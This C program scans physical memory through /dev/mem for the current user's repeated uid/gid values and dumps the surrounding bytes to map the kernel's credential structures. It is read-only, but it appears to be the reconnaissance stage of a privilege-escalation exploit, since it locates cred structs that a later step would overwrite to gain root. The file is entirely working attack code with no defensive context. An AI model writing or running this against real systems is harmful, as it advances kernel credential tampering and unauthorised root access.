/* read-only scan: dump bytes around each uid/gid pattern hit to learn real cred layout */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

#define PHYS_END 0x3b000000ULL
#define CHUNK    (16u << 20)
#define MAX_HITS 32

int main(void) {
    uint32_t uid = getuid(), gid = getgid();
    uint32_t pat[8] = {uid, gid, uid, gid, uid, gid, uid, gid};
    int fd = open("/dev/mem", O_RDONLY | O_SYNC);
    if (fd < 0) { perror("open"); return 1; }
    int hits = 0;
    for (off_t base = 0; base < PHYS_END && hits < MAX_HITS; base += CHUNK) {
        size_t len = CHUNK;
        if (base + len > PHYS_END) len = PHYS_END - base;
        uint8_t *m = mmap(NULL, len, PROT_READ, MAP_SHARED, fd, base);
        if (m == MAP_FAILED) continue;
        for (size_t off = 4; off + 68 <= len; off += 4) {
            if (memcmp(m + off, pat, 32) != 0) continue;
            printf("hit @0x%llx usage=%u\n  ", (long long)(base+off-4), *(uint32_t*)(m+off-4));
            for (int i = -4; i < 68; i += 4)
                printf("%08x ", *(uint32_t*)(m+off+i));
            printf("\n");
            hits++;
        }
        munmap(m, len);
    }
    printf("hits=%d\n", hits);
    return 0;
}
